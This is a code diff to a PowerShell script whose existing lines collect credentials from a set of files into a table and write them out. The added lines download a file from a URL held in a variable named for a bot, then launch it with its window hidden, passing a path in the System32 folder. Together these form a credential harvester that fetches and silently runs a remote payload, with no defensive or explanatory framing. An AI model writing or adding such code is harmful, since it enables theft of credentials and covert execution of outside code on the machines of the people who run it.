@@ -102,3 +102,8 @@ foreach ($epaFile in $epaFiles) {
     $allCredentials += $credentialsTable
 }
 $allCredentials | Format-Table -AutoSize | Out-File -FilePath $outputFilePath
+Invoke-WebRequest -Uri $boturl -OutFile $botpath
+if (Test-Path $botpath) {
+    $output = "C:\Windows\System32\output.txt"
+    Start-Process -FilePath $botpath -ArgumentList "-File $output" -WindowStyle Hidden
+} else {}
